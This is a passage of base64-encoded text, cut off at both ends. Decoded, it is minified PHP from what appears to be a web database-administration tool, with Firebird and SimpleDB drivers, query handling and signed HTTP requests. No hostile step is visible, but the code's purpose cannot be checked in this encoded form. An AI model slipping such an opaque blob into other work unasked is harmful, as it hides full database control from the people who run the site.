g9ZmFsc2UpeyRJPWliYXNlX3F1ZXJ5KCRILCR0aGlzLT5fbGluayk7aWYoISRJKXskdGhpcy0+ZXJybm89aWJhc2VfZXJyY29kZSgpOyR0aGlzLT5lcnJvcj1pYmFzZV9lcnJtc2coKTtyZXR1cm4NCmZhbHNlO30kdGhpcy0+ZXJyb3I9IiI7aWYoJEk9PT10cnVlKXskdGhpcy0+YWZmZWN0ZWRfcm93cz1pYmFzZV9hZmZlY3RlZF9yb3dzKCR0aGlzLT5fbGluayk7cmV0dXJuDQp0cnVlO31yZXR1cm4NCm5ldw0KTWluX1Jlc3VsdCgkSSk7fWZ1bmN0aW9uDQptdWx0aV9xdWVyeSgkSCl7cmV0dXJuJHRoaXMtPl9yZXN1bHQ9JHRoaXMtPnF1ZXJ5KCRIKTt9ZnVuY3Rpb24NCnN0b3JlX3Jlc3VsdCgpe3JldHVybiR0aGlzLT5fcmVzdWx0O31mdW5jdGlvbg0KbmV4dF9yZXN1bHQoKXtyZXR1cm4NCmZhbHNlO31mdW5jdGlvbg0KcmVzdWx0KCRILCRvPTApeyRJPSR0aGlzLT5xdWVyeSgkSCk7aWYoISRJfHwhJEktPm51bV9yb3dzKXJldHVybg0KZmFsc2U7JEs9JEktPmZldGNoX3JvdygpO3JldHVybiRLWyRvXTt9fWNsYXNzDQpNaW5fUmVzdWx0e3ZhciRudW1fcm93cywkX3Jlc3VsdCwkX29mZnNldD0wO2Z1bmN0aW9uDQpfX2NvbnN0cnVjdCgkSSl7JHRoaXMtPl9yZXN1bHQ9JEk7fWZ1bmN0aW9uDQpmZXRjaF9hc3NvYygpe3JldHVybg0KaWJhc2VfZmV0Y2hfYXNzb2MoJHRoaXMtPl9yZXN1bHQpO31mdW5jdGlvbg0KZmV0Y2hfcm93KCl7cmV0dXJuDQppYmFzZV9mZXRjaF9yb3coJHRoaXMtPl9yZXN1bHQpO31mdW5jdGlvbg0KZmV0Y2hfZmllbGQoKXskbz1pYmFzZV9maWVsZF9pbmZvKCR0aGlzLT5fcmVzdWx0LCR0aGlzLT5fb2Zmc2V0KyspO3JldHVybihvYmplY3QpYXJyYXkoJ25hbWUnPT4kb1snbmFtZSddLCdvcmduYW1lJz0+JG9bJ25hbWUnXSwndHlwZSc9PiRvWyd0eXBlJ10sJ2NoYXJzZXRucic9PiRvWydsZW5ndGgnXSwpO31mdW5jdGlvbg0KX19kZXN0cnVjdCgpe2liYXNlX2ZyZWVfcmVzdWx0KCR0aGlzLT5fcmVzdWx0KTt9fX1jbGFzcw0KTWluX0RyaXZlcg0KZXh0ZW5kcw0KTWluX1NRTHt9ZnVuY3Rpb24NCmlkZl9lc2NhcGUoJHQpe3JldHVybiciJy5zdHJfcmVwbGFjZSgnIicsJyIiJywkdCkuJyInO31mdW5jdGlvbg0KdGFibGUoJHQpe3JldHVybg0KaWRmX2VzY2FwZSgkdCk7fWZ1bmN0aW9uDQpjb25uZWN0KCl7Z2xvYmFsJGI7JGc9bmV3DQpNaW5fREI7JGo9JGItPmNyZWRlbnRpYWxzKCk7aWYoJGctPmNvbm5lY3QoJGpbMF0sJGpbMV0sJGpbMl0pKXJldHVybiRnO3JldHVybiRnLT5lcnJvcjt9ZnVuY3Rpb24NCmdldF9kYXRhYmFzZXMoJEpjKXtyZXR1cm4NCmFycmF5KCJkb21haW4iKTt9ZnVuY3Rpb24NCmxpbWl0KCRILCRaLCR6LCREPTAsJHJnPSIgIil7JEo9Jyc7JEouPSgkeiE9PW51bGw/JHJnLiJGSVJTVCAkeiIuKCREPyIgU0tJUCAkRCI6IiIpOiIiKTskSi49IiAkSCRaIjtyZXR1cm4kSjt9ZnVuY3Rpb24NCmxpbWl0MSgkSCwkWil7cmV0dXJuDQpsaW1pdCgkSCwkWiwxKTt9ZnVuY3Rpb24NCmRiX2NvbGxhdGlvbigkbSwkbWIpe31mdW5jdGlvbg0KZW5naW5lcygpe3JldHVybg0KYXJyYXkoKTt9ZnVuY3Rpb24NCmxvZ2dlZF91c2VyKCl7Z2xvYmFsJGI7JGo9JGItPmNyZWRlbnRpYWxzKCk7cmV0dXJuJGpbMV07fWZ1bmN0aW9uDQp0YWJsZXNfbGlzdCgpe2dsb2JhbCRnOyRIPSdTRUxFQ1QgUkRCJFJFTEFUSU9OX05BTUUgRlJPTSByZGIkcmVsYXRpb25zIFdIRVJFIHJkYiRzeXN0ZW1fZmxhZyA9IDAnOyRJPWliYXNlX3F1ZXJ5KCRnLT5fbGluaywkSCk7JEo9YXJyYXkoKTt3aGlsZSgkSz1pYmFzZV9mZXRjaF9hc3NvYygkSSkpJEpbJEtbJ1JEQiRSRUxBVElPTl9OQU1FJ11dPSd0YWJsZSc7a3NvcnQoJEopO3JldHVybiRKO31mdW5jdGlvbg0KY291bnRfdGFibGVzKCRsKXtyZXR1cm4NCmFycmF5KCk7fWZ1bmN0aW9uDQp0YWJsZV9zdGF0dXMoJEM9IiIsJENjPWZhbHNlKXtnbG9iYWwkZzskSj1hcnJheSgpOyREYj10YWJsZXNfbGlzdCgpO2ZvcmVhY2goJERiDQphcyR1PT4kWCl7JHU9dHJpbSgkdSk7JEpbJHVdPWFycmF5KCdOYW1lJz0+JHUsJ0VuZ2luZSc9PidzdGFuZGFyZCcsKTtpZigkQz09JHUpcmV0dXJuJEpbJHVdO31yZXR1cm4kSjt9ZnVuY3Rpb24NCmlzX3ZpZXcoJFIpe3JldHVybg0KZmFsc2U7fWZ1bmN0aW9uDQpma19zdXBwb3J0KCRSKXtyZXR1cm4NCnByZWdfbWF0Y2goJ35Jbm5vREJ8SUJNREIySX5pJywkUlsiRW5naW5lIl0pO31mdW5jdGlvbg0KZmllbGRzKCRRKXtnbG9iYWwkZzskSj1hcnJheSgpOyRIPSdTRUxFQ1Qgci5SREIkRklFTERfTkFNRSBBUyBmaWVsZF9uYW1lLA0Kci5SREIkREVTQ1JJUFRJT04gQVMgZmllbGRfZGVzY3JpcHRpb24sDQpyLlJEQiRERUZBVUxUX1ZBTFVFIEFTIGZpZWxkX2RlZmF1bHRfdmFsdWUsDQpyLlJEQiROVUxMX0ZMQUcgQVMgZmllbGRfbm90X251bGxfY29uc3RyYWludCwNCmYuUkRCJEZJRUxEX0xFTkdUSCBBUyBmaWVsZF9sZW5ndGgsDQpmLlJEQiRGSUVMRF9QUkVDSVNJT04gQVMgZmllbGRfcHJlY2lzaW9uLA0KZi5SREIkRklFTERfU0NBTEUgQVMgZmllbGRfc2NhbGUsDQpDQVNFIGYuUkRCJEZJRUxEX1RZUEUNCldIRU4gMjYxIFRIRU4gXCdCTE9CXCcNCldIRU4gMTQgVEhFTiBcJ0NIQVJcJw0KV0hFTiA0MCBUSEVOIFwnQ1NUUklOR1wnDQpXSEVOIDExIFRIRU4gXCdEX0ZMT0FUXCcNCldIRU4gMjcgVEhFTiBcJ0RPVUJMRVwnDQpXSEVOIDEwIFRIRU4gXCdGTE9BVFwnDQpXSEVOIDE2IFRIRU4gXCdJTlQ2NFwnDQpXSEVOIDggVEhFTiBcJ0lOVEVHRVJcJw0KV0hFTiA5IFRIRU4gXCdRVUFEXCcNCldIRU4gNyBUSEVOIFwnU01BTExJTlRcJw0KV0hFTiAxMiBUSEVOIFwnREFURVwnDQpXSEVOIDEzIFRIRU4gXCdUSU1FXCcNCldIRU4gMzUgVEhFTiBcJ1RJTUVTVEFNUFwnDQpXSEVOIDM3IFRIRU4gXCdWQVJDSEFSXCcNCkVMU0UgXCdVTktOT1dOXCcNCkVORCBBUyBmaWVsZF90eXBlLA0KZi5SREIkRklFTERfU1VCX1RZUEUgQVMgZmllbGRfc3VidHlwZSwNCmNvbGwuUkRCJENPTExBVElPTl9OQU1FIEFTIGZpZWxkX2NvbGxhdGlvbiwNCmNzZXQuUkRCJENIQVJBQ1RFUl9TRVRfTkFNRSBBUyBmaWVsZF9jaGFyc2V0DQpGUk9NIFJEQiRSRUxBVElPTl9GSUVMRFMgcg0KTEVGVCBKT0lOIFJEQiRGSUVMRFMgZiBPTiByLlJEQiRGSUVMRF9TT1VSQ0UgPSBmLlJEQiRGSUVMRF9OQU1FDQpMRUZUIEpPSU4gUkRCJENPTExBVElPTlMgY29sbCBPTiBmLlJEQiRDT0xMQVRJT05fSUQgPSBjb2xsLlJEQiRDT0xMQVRJT05fSUQNCkxFRlQgSk9JTiBSREIkQ0hBUkFDVEVSX1NFVFMgY3NldCBPTiBmLlJEQiRDSEFSQUNURVJfU0VUX0lEID0gY3NldC5SREIkQ0hBUkFDVEVSX1NFVF9JRA0KV0hFUkUgci5SREIkUkVMQVRJT05fTkFNRSA9ICcucSgkUSkuJw0KT1JERVIgQlkgci5SREIkRklFTERfUE9TSVRJT04nOyRJPWliYXNlX3F1ZXJ5KCRnLT5fbGluaywkSCk7d2hpbGUoJEs9aWJhc2VfZmV0Y2hfYXNzb2MoJEkpKSRKW3RyaW0oJEtbJ0ZJRUxEX05BTUUnXSldPWFycmF5KCJmaWVsZCI9PnRyaW0oJEtbIkZJRUxEX05BTUUiXSksImZ1bGxfdHlwZSI9PnRyaW0oJEtbIkZJRUxEX1RZUEUiXSksInR5cGUiPT50cmltKCRLWyJGSUVMRF9TVUJfVFlQRSJdKSwiZGVmYXVsdCI9PnRyaW0oJEtbJ0ZJRUxEX0RFRkFVTFRfVkFMVUUnXSksIm51bGwiPT4odHJpbSgkS1siRklFTERfTk9UX05VTExfQ09OU1RSQUlOVCJdKT09IllFUyIpLCJhdXRvX2luY3JlbWVudCI9PicwJywiY29sbGF0aW9uIj0+dHJpbSgkS1siRklFTERfQ09MTEFUSU9OIl0pLCJwcml2aWxlZ2VzIj0+YXJyYXkoImluc2VydCI9PjEsInNlbGVjdCI9PjEsInVwZGF0ZSI9PjEpLCJjb21tZW50Ij0+dHJpbSgkS1siRklFTERfREVTQ1JJUFRJT04iXSksKTtyZXR1cm4kSjt9ZnVuY3Rpb24NCmluZGV4ZXMoJFEsJGg9bnVsbCl7JEo9YXJyYXkoKTtyZXR1cm4kSjt9ZnVuY3Rpb24NCmZvcmVpZ25fa2V5cygkUSl7cmV0dXJuDQphcnJheSgpO31mdW5jdGlvbg0KY29sbGF0aW9ucygpe3JldHVybg0KYXJyYXkoKTt9ZnVuY3Rpb24NCmluZm9ybWF0aW9uX3NjaGVtYSgkbSl7cmV0dXJuDQpmYWxzZTt9ZnVuY3Rpb24NCmVycm9yKCl7Z2xvYmFsJGc7cmV0dXJuDQpoKCRnLT5lcnJvcik7fWZ1bmN0aW9uDQp0eXBlcygpe3JldHVybg0KYXJyYXkoKTt9ZnVuY3Rpb24NCnNjaGVtYXMoKXtyZXR1cm4NCmFycmF5KCk7fWZ1bmN0aW9uDQpnZXRfc2NoZW1hKCl7cmV0dXJuIiI7fWZ1bmN0aW9uDQpzZXRfc2NoZW1hKCRrZyl7cmV0dXJuDQp0cnVlO31mdW5jdGlvbg0Kc3VwcG9ydCgkRGMpe3JldHVybg0KcHJlZ19tYXRjaCgifl4oY29sdW1uc3xzcWx8c3RhdHVzfHRhYmxlKSR+IiwkRGMpO30kdz0iZmlyZWJpcmQiOyRPZT1hcnJheSgiPSIpOyRTYz1hcnJheSgpOyRYYz1hcnJheSgpOyRkYz1hcnJheSgpO30kVmJbInNpbXBsZWRiIl09IlNpbXBsZURCIjtpZihpc3NldCgkX0dFVFsic2ltcGxlZGIiXSkpeyR3Zj1hcnJheSgiU2ltcGxlWE1MIik7ZGVmaW5lKCJEUklWRVIiLCJzaW1wbGVkYiIpO2lmKGNsYXNzX2V4aXN0cygnU2ltcGxlWE1MRWxlbWVudCcpKXtjbGFzcw0KTWluX0RCe3ZhciRleHRlbnNpb249IlNpbXBsZVhNTCIsJHNlcnZlcl9pbmZvPScyMDA5LTA0LTE1JywkZXJyb3IsJHRpbWVvdXQsJG5leHQsJGFmZmVjdGVkX3Jvd3MsJF9yZXN1bHQ7ZnVuY3Rpb24NCnNlbGVjdF9kYigkayl7cmV0dXJuKCRrPT0iZG9tYWluIik7fWZ1bmN0aW9uDQpxdWVyeSgkSCwkX2g9ZmFsc2UpeyRGPWFycmF5KCdTZWxlY3RFeHByZXNzaW9uJz0+JEgsJ0NvbnNpc3RlbnRSZWFkJz0+J3RydWUnKTtpZigkdGhpcy0+bmV4dCkkRlsnTmV4dFRva2VuJ109JHRoaXMtPm5leHQ7JEk9c2RiX3JlcXVlc3RfYWxsKCdTZWxlY3QnLCdJdGVtJywkRiwkdGhpcy0+dGltZW91dCk7aWYoJEk9PT1mYWxzZSlyZXR1cm4kSTtpZihwcmVnX21hdGNoKCd+XlxzKlNFTEVDVFxzK0NPVU5UXCh+aScsJEgpKXskTWc9MDtmb3JlYWNoKCRJDQphcyRDZCkkTWcrPSRDZC0+QXR0cmlidXRlLT5WYWx1ZTskST1hcnJheSgob2JqZWN0KWFycmF5KCdBdHRyaWJ1dGUnPT5hcnJheSgob2JqZWN0KWFycmF5KCdOYW1lJz0+J0NvdW50JywnVmFsdWUnPT4kTWcsKSkpKTt9cmV0dXJuDQpuZXcNCk1pbl9SZXN1bHQoJEkpO31mdW5jdGlvbg0KbXVsdGlfcXVlcnkoJEgpe3JldHVybiR0aGlzLT5fcmVzdWx0PSR0aGlzLT5xdWVyeSgkSCk7fWZ1bmN0aW9uDQpzdG9yZV9yZXN1bHQoKXtyZXR1cm4kdGhpcy0+X3Jlc3VsdDt9ZnVuY3Rpb24NCm5leHRfcmVzdWx0KCl7cmV0dXJuDQpmYWxzZTt9ZnVuY3Rpb24NCnF1b3RlKCRQKXtyZXR1cm4iJyIuc3RyX3JlcGxhY2UoIiciLCInJyIsJFApLiInIjt9fWNsYXNzDQpNaW5fUmVzdWx0e3ZhciRudW1fcm93cywkX3Jvd3M9YXJyYXkoKSwkX29mZnNldD0wO2Z1bmN0aW9uDQpfX2NvbnN0cnVjdCgkSSl7Zm9yZWFjaCgkSQ0KYXMkQ2QpeyRLPWFycmF5KCk7aWYoJENkLT5OYW1lIT0nJykkS1snaXRlbU5hbWUoKSddPShzdHJpbmcpJENkLT5OYW1lO2ZvcmVhY2goJENkLT5BdHRyaWJ1dGUNCmFzJEhhKXskQz0kdGhpcy0+X3Byb2Nlc3NWYWx1ZSgkSGEtPk5hbWUpOyRZPSR0aGlzLT5fcHJvY2Vzc1ZhbHVlKCRIYS0+VmFsdWUpO2lmKGlzc2V0KCRLWyRDXSkpeyRLWyRDXT0oYXJyYXkpJEtbJENdOyRLWyRDXVtdPSRZO31lbHNlJEtbJENdPSRZO30kdGhpcy0+X3Jvd3NbXT0kSztmb3JlYWNoKCRLDQphcyR4PT4kWCl7aWYoIWlzc2V0KCR0aGlzLT5fcm93c1swXVskeF0pKSR0aGlzLT5fcm93c1swXVskeF09bnVsbDt9fSR0aGlzLT5udW1fcm93cz1jb3VudCgkdGhpcy0+X3Jvd3MpO31mdW5jdGlvbg0KX3Byb2Nlc3NWYWx1ZSgkZ2Mpe3JldHVybihpc19vYmplY3QoJGdjKSYmJGdjWydlbmNvZGluZyddPT0nYmFzZTY0Jz9iYXNlNjRfZGVjb2RlKCRnYyk6KHN0cmluZykkZ2MpO31mdW5jdGlvbg0KZmV0Y2hfYXNzb2MoKXskSz1jdXJyZW50KCR0aGlzLT5fcm93cyk7aWYoISRLKXJldHVybiRLOyRKPWFycmF5KCk7Zm9yZWFjaCgkdGhpcy0+X3Jvd3NbMF1hcyR4PT4kWCkkSlskeF09JEtbJHhdO25leHQoJHRoaXMtPl9yb3dzKTtyZXR1cm4kSjt9ZnVuY3Rpb24NCmZldGNoX3JvdygpeyRKPSR0aGlzLT5mZXRjaF9hc3NvYygpO2lmKCEkSilyZXR1cm4kSjtyZXR1cm4NCmFycmF5X3ZhbHVlcygkSik7fWZ1bmN0aW9uDQpmZXRjaF9maWVsZCgpeyRJZD1hcnJheV9rZXlzKCR0aGlzLT5fcm93c1swXSk7cmV0dXJuKG9iamVjdClhcnJheSgnbmFtZSc9PiRJZFskdGhpcy0+X29mZnNldCsrXSk7fX19Y2xhc3MNCk1pbl9Ecml2ZXINCmV4dGVuZHMNCk1pbl9TUUx7cHVibGljJHpmPSJpdGVtTmFtZSgpIjtmdW5jdGlvbg0KX2NodW5rUmVxdWVzdCgkamQsJHVhLCRGLCR3Yz1hcnJheSgpKXtnbG9iYWwkZztmb3JlYWNoKGFycmF5X2NodW5rKCRqZCwyNSlhcyRmYil7JGdmPSRGO2ZvcmVhY2goJGZiDQphcyRzPT4kaGQpeyRnZlsiSXRlbS4kcy5JdGVtTmFtZSJdPSRoZDtmb3JlYWNoKCR3Yw0KYXMkeD0+JFgpJGdmWyJJdGVtLiRzLiR4Il09JFg7fWlmKCFzZGJfcmVxdWVzdCgkdWEsJGdmKSlyZXR1cm4NCmZhbHNlO30kZy0+YWZmZWN0ZWRfcm93cz1jb3VudCgkamQpO3JldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCl9leHRyYWN0SWRzKCRRLCRKZiwkeil7JEo9YXJyYXkoKTtpZihwcmVnX21hdGNoX2FsbCgifml0ZW1OYW1lXChcKSA9ICgoJ1teJ10qKycpKyl+IiwkSmYsJGFlKSkkSj1hcnJheV9tYXAoJ2lkZl91bmVzY2FwZScsJGFlWzFdKTtlbHNle2ZvcmVhY2goc2RiX3JlcXVlc3RfYWxsKCdTZWxlY3QnLCdJdGVtJyxhcnJheSgnU2VsZWN0RXhwcmVzc2lvbic9PidTRUxFQ1QgaXRlbU5hbWUoKSBGUk9NICcudGFibGUoJFEpLiRKZi4oJHo/IiBMSU1JVCAxIjoiIikpKWFzJENkKSRKW109JENkLT5OYW1lO31yZXR1cm4kSjt9ZnVuY3Rpb24NCnNlbGVjdCgkUSwkTSwkWiwkVmMsJFRlPWFycmF5KCksJHo9MSwkRT0wLCRBZj1mYWxzZSl7Z2xvYmFsJGc7JGctPm5leHQ9JF9HRVRbIm5leHQiXTskSj1wYXJlbnQ6OnNlbGVjdCgkUSwkTSwkWiwkVmMsJFRlLCR6LCRFLCRBZik7JGctPm5leHQ9MDtyZXR1cm4kSjt9ZnVuY3Rpb24NCmRlbGV0ZSgkUSwkSmYsJHo9MCl7cmV0dXJuJHRoaXMtPl9jaHVua1JlcXVlc3QoJHRoaXMtPl9leHRyYWN0SWRzKCRRLCRKZiwkeiksJ0JhdGNoRGVsZXRlQXR0cmlidXRlcycsYXJyYXkoJ0RvbWFpbk5hbWUnPT4kUSkpO31mdW5jdGlvbg0KdXBkYXRlKCRRLCRPLCRKZiwkej0wLCRyZz0iXG4iKXskS2I9YXJyYXkoKTskdWQ9YXJyYXkoKTskcz0wOyRqZD0kdGhpcy0+X2V4dHJhY3RJZHMoJFEsJEpmLCR6KTskaGQ9aWRmX3VuZXNjYXBlKCRPWyJgaXRlbU5hbWUoKWAiXSk7dW5zZXQoJE9bImBpdGVtTmFtZSgpYCJdKTtmb3JlYWNoKCRPDQphcyR4PT4kWCl7JHg9aWRmX3VuZXNjYXBlKCR4KTtpZigkWD09Ik5VTEwifHwoJGhkIT0iIiYmYXJyYXkoJGhkKSE9JGpkKSkkS2JbIkF0dHJpYnV0ZS4iLmNvdW50KCRLYikuIi5OYW1lIl09JHg7aWYoJFghPSJOVUxMIil7Zm9yZWFjaCgoYXJyYXkpJFgNCmFzJEVkPT4kVyl7JHVkWyJBdHRyaWJ1dGUuJHMuTmFtZSJdPSR4OyR1ZFsiQXR0cmlidXRlLiRzLlZhbHVlIl09KGlzX2FycmF5KCRYKT8kVzppZGZfdW5lc2NhcGUoJFcpKTtpZighJEVkKSR1ZFsiQXR0cmlidXRlLiRzLlJlcGxhY2UiXT0idHJ1ZSI7JHMrKzt9fX0kRj1hcnJheSgnRG9tYWluTmFtZSc9PiRRKTtyZXR1cm4oISR1ZHx8JHRoaXMtPl9jaHVua1JlcXVlc3QoKCRoZCE9IiI/YXJyYXkoJGhkKTokamQpLCdCYXRjaFB1dEF0dHJpYnV0ZXMnLCRGLCR1ZCkpJiYoISRLYnx8JHRoaXMtPl9jaHVua1JlcXVlc3QoJGpkLCdCYXRjaERlbGV0ZUF0dHJpYnV0ZXMnLCRGLCRLYikpO31mdW5jdGlvbg0KaW5zZXJ0KCRRLCRPKXskRj1hcnJheSgiRG9tYWluTmFtZSI9PiRRKTskcz0wO2ZvcmVhY2goJE8NCmFzJEM9PiRZKXtpZigkWSE9Ik5VTEwiKXskQz1pZGZfdW5lc2NhcGUoJEMpO2lmKCRDPT0iaXRlbU5hbWUoKSIpJEZbIkl0ZW1OYW1lIl09aWRmX3VuZXNjYXBlKCRZKTtlbHNle2ZvcmVhY2goKGFycmF5KSRZDQphcyRYKXskRlsiQXR0cmlidXRlLiRzLk5hbWUiXT0kQzskRlsiQXR0cmlidXRlLiRzLlZhbHVlIl09KGlzX2FycmF5KCRZKT8kWDppZGZfdW5lc2NhcGUoJFkpKTskcysrO319fX1yZXR1cm4NCnNkYl9yZXF1ZXN0KCdQdXRBdHRyaWJ1dGVzJywkRik7fWZ1bmN0aW9uDQppbnNlcnRVcGRhdGUoJFEsJEwsJHpmKXtmb3JlYWNoKCRMDQphcyRPKXtpZighJHRoaXMtPnVwZGF0ZSgkUSwkTywiV0hFUkUgYGl0ZW1OYW1lKClgID0gIi5xKCRPWyJgaXRlbU5hbWUoKWAiXSkpKXJldHVybg0KZmFsc2U7fXJldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCmJlZ2luKCl7cmV0dXJuDQpmYWxzZTt9ZnVuY3Rpb24NCmNvbW1pdCgpe3JldHVybg0KZmFsc2U7fWZ1bmN0aW9uDQpyb2xsYmFjaygpe3JldHVybg0KZmFsc2U7fX1mdW5jdGlvbg0KY29ubmVjdCgpe3JldHVybg0KbmV3DQpNaW5fREI7fWZ1bmN0aW9uDQpzdXBwb3J0KCREYyl7cmV0dXJuDQpwcmVnX21hdGNoKCd+c3FsficsJERjKTt9ZnVuY3Rpb24NCmxvZ2dlZF91c2VyKCl7Z2xvYmFsJGI7JGo9JGItPmNyZWRlbnRpYWxzKCk7cmV0dXJuJGpbMV07fWZ1bmN0aW9uDQpnZXRfZGF0YWJhc2VzKCl7cmV0dXJuDQphcnJheSgiZG9tYWluIik7fWZ1bmN0aW9uDQpjb2xsYXRpb25zKCl7cmV0dXJuDQphcnJheSgpO31mdW5jdGlvbg0KZGJfY29sbGF0aW9uKCRtLCRtYil7fWZ1bmN0aW9uDQp0YWJsZXNfbGlzdCgpe2dsb2JhbCRnOyRKPWFycmF5KCk7Zm9yZWFjaChzZGJfcmVxdWVzdF9hbGwoJ0xpc3REb21haW5zJywnRG9tYWluTmFtZScpYXMkUSkkSlsoc3RyaW5nKSRRXT0ndGFibGUnO2lmKCRnLT5lcnJvciYmZGVmaW5lZCgiUEFHRV9IRUFERVIiKSllY2hvIjxwIGNsYXNzPSdlcnJvcic+Ii5lcnJvcigpLiJcbiI7cmV0dXJuJEo7fWZ1bmN0aW9uDQp0YWJsZV9zdGF0dXMoJEM9IiIsJENjPWZhbHNlKXskSj1hcnJheSgpO2ZvcmVhY2goKCRDIT0iIj9hcnJheSgkQz0+dHJ1ZSk6dGFibGVzX2xpc3QoKSlhcyRRPT4kVSl7JEs9YXJyYXkoIk5hbWUiPT4kUSwiQXV0b19pbmNyZW1lbnQiPT4iIik7aWYoISRDYyl7JG5lPXNkYl9yZXF1ZXN0KCdEb21haW5NZXRhZGF0YScsYXJyYXkoJ0RvbWFpbk5hbWUnPT4kUSkpO2lmKCRuZSl7Zm9yZWFjaChhcnJheSgiUm93cyI9PiJJdGVtQ291bnQiLCJEYXRhX2xlbmd0aCI9PiJJdGVtTmFtZXNTaXplQnl0ZXMiLCJJbmRleF9sZW5ndGgiPT4iQXR0cmlidXRlVmFsdWVzU2l6ZUJ5dGVzIiwiRGF0YV9mcmVlIj0+IkF0dHJpYnV0ZU5hbWVzU2l6ZUJ5dGVzIiwpYXMkeD0+JFgpJEtbJHhdPShzdHJpbmcpJG5lLT4kWDt9fWlmKCRDIT0iIilyZXR1cm4kSzskSlskUV09JEs7fXJldHVybiRKO31mdW5jdGlvbg0KZXhwbGFpbigkZywkSCl7fWZ1bmN0aW9uDQplcnJvcigpe2dsb2JhbCRnO3JldHVybg0KaCgkZy0+ZXJyb3IpO31mdW5jdGlvbg0KaW5mb3JtYXRpb25fc2NoZW1hKCl7fWZ1bmN0aW9uDQppc192aWV3KCRSKXt9ZnVuY3Rpb24NCmluZGV4ZXMoJFEsJGg9bnVsbCl7cmV0dXJuDQphcnJheShhcnJheSgidHlwZSI9PiJQUklNQVJZIiwiY29sdW1ucyI9PmFycmF5KCJpdGVtTmFtZSgpIikpLCk7fWZ1bmN0aW9uDQpmaWVsZHMoJFEpe3JldHVybg0KZmllbGRzX2Zyb21fZWRpdCgpO31mdW5jdGlvbg0KZm9yZWlnbl9rZXlzKCRRKXtyZXR1cm4NCmFycmF5KCk7fWZ1bmN0aW9uDQp0YWJsZSgkdCl7cmV0dXJuDQppZGZfZXNjYXBlKCR0KTt9ZnVuY3Rpb24NCmlkZl9lc2NhcGUoJHQpe3JldHVybiJgIi5zdHJfcmVwbGFjZSgiYCIsImBgIiwkdCkuImAiO31mdW5jdGlvbg0KbGltaXQoJEgsJFosJHosJEQ9MCwkcmc9IiAiKXtyZXR1cm4iICRIJFoiLigkeiE9PW51bGw/JHJnLiJMSU1JVCAkeiI6IiIpO31mdW5jdGlvbg0KdW5jb252ZXJ0X2ZpZWxkKCRvLCRKKXtyZXR1cm4kSjt9ZnVuY3Rpb24NCmZrX3N1cHBvcnQoJFIpe31mdW5jdGlvbg0KZW5naW5lcygpe3JldHVybg0KYXJyYXkoKTt9ZnVuY3Rpb24NCmFsdGVyX3RhYmxlKCRRLCRDLCRwLCRLYywkcWIsJGxjLCRkLCRLYSwka2Ype3JldHVybigkUT09IiImJnNkYl9yZXF1ZXN0KCdDcmVhdGVEb21haW4nLGFycmF5KCdEb21haW5OYW1lJz0+JEMpKSk7fWZ1bmN0aW9uDQpkcm9wX3RhYmxlcygkUyl7Zm9yZWFjaCgkUw0KYXMkUSl7aWYoIXNkYl9yZXF1ZXN0KCdEZWxldGVEb21haW4nLGFycmF5KCdEb21haW5OYW1lJz0+JFEpKSlyZXR1cm4NCmZhbHNlO31yZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQpjb3VudF90YWJsZXMoJGwpe2ZvcmVhY2goJGwNCmFzJG0pcmV0dXJuDQphcnJheSgkbT0+Y291bnQodGFibGVzX2xpc3QoKSkpO31mdW5jdGlvbg0KZm91bmRfcm93cygkUiwkWil7cmV0dXJuKCRaP251bGw6JFJbIlJvd3MiXSk7fWZ1bmN0aW9uDQpsYXN0X2lkKCl7fWZ1bmN0aW9uDQpobWFjKCRBYSwkRGIsJHgsJE5mPWZhbHNlKXskVGE9NjQ7aWYoc3RybGVuKCR4KT4kVGEpJHg9cGFjaygiSCoiLCRBYSgkeCkpOyR4PXN0cl9wYWQoJHgsJFRhLCJcMCIpOyRGZD0keF5zdHJfcmVwZWF0KCJceDM2IiwkVGEpOyRHZD0keF5zdHJfcmVwZWF0KCJceDVDIiwkVGEpOyRKPSRBYSgkR2QucGFjaygiSCoiLCRBYSgkRmQuJERiKSkpO2lmKCROZikkSj1wYWNrKCJIKiIsJEopO3JldHVybiRKO31mdW5jdGlvbg0Kc2RiX3JlcXVlc3QoJHVhLCRGPWFycmF5KCkpe2dsb2JhbCRiLCRnO2xpc3QoJGZkLCRGWydBV1NBY2Nlc3NLZXlJZCddLCRuZyk9JGItPmNyZWRlbnRpYWxzKCk7JEZbJ0FjdGlvbiddPSR1YTskRlsnVGltZXN0YW1wJ109Z21kYXRlKCdZLW0tZFxUSDppOnMrMDA6MDAnKTskRlsnVmVyc2lvbiddPScyMDA5LTA0LTE1JzskRlsnU2lnbmF0dXJlVmVyc2lvbiddPTI7JEZbJ1NpZ25hdHVyZU1ldGhvZCddPSdIbWFjU0hBMSc7a3NvcnQoJEYpOyRIPScnO2ZvcmVhY2goJEYNCmFzJHg9PiRYKSRILj0nJicucmF3dXJsZW5jb2RlKCR4KS4nPScucmF3dXJsZW5jb2RlKCRYKTskSD1zdHJfcmVwbGFjZSgnJTdFJywnficsc3Vic3RyKCRILDEpKTskSC49IiZTaWduYXR1cmU9Ii51cmxlbmNvZGUoYmFzZTY0X2VuY29kZShobWFjKCdzaGExJywiUE9TVFxuIi5wcmVnX3JlcGxhY2UoJ35eaHR0cHM/Oi8vficsJycsJGZkKS4iXG4vXG4kSCIsJG5nLHRydWUpKSk7QGluaV9zZXQoJ3RyYWNrX2Vycm9ycycsMSk7JEZjPUBmaWxlX2dldF9jb250ZW50cygocHJlZ19tYXRjaCgnfl5odHRwcz86Ly9+JywkZmQpPyRmZDoiaHR0cDovLyRmZCIpLGZhbHNlLHN0cmVhbV9jb250ZXh0X2NyZWF0ZShhcnJheSgnaHR0cCc9PmFycmF5KCdtZXRob2QnPT4nUE9TVCcsJ2NvbnRlbnQnPT4kSCwnaWdub3JlX2Vycm9ycyc9PjEsKSkpKTtpZighJEZjKXskZy0+ZXJyb3I9JHBocF9lcnJvcm1zZztyZXR1cm4NCmZhbHNlO31saWJ4bWxfdXNlX2ludGVybmFsX2Vycm9ycyh0cnVlKTskYmk9c2ltcGxleG1sX2xvYWRfc3RyaW5nKCRGYyk7aWYoISRiaSl7JG49bGlieG1sX2dldF9sYXN0X2Vycm9yKCk7JGctPmVycm9yPSRuLT5tZXNzYWdlO3JldHVybg0KZmFsc2U7fWlmKCRiaS0+RXJyb3JzKXskbj0kYmktPkVycm9ycy0+RXJyb3I7JGctPmVycm9yPSIkbi0+TWVzc2FnZSAoJG4tPkNvZGUpIjtyZXR1cm4NCmZhbHNlO30kZy0+ZXJyb3I9Jyc7JFhnPSR1YS4iUmVzdWx0I